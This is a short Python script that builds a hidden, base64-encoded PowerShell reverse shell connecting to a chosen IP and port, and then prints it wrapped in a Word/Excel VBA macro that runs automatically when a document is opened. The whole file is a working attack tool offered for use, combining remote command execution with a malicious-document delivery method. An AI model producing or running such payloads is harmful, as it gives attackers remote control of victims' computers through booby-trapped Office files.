#!/usr/bin/env python3
#
# generate reverse powershell cmdline with base64 encoded args
#

import sys
import base64

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
    exit()
    

print("\n====================================")
print("Windows Reverse Shell Base64 Encoded")
print("====================================\n")

try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

# payload from Nikhil Mittal @samratashok
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

cmdline = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmdline)

print("\n====================================")
print("Payload for MACROS")
print("====================================\n")

str = cmdline

n = 50
print("\nSub AutoOpen()")
print("\tMyMacro")
print("End Sub\n")
print("Sub Document_Open()")
print("\tMyMacro")
print("End Sub")
print("\nSub MyMacro()")
print("\tDim Str As String\n")

for i in range (0, len(str), n):
    print("\tStr = Str + " + '"' + str[i:i+n] + '"')

print("\n\tCreateObject(\"Wscript.Shell\").Run Str")
print("End Sub")
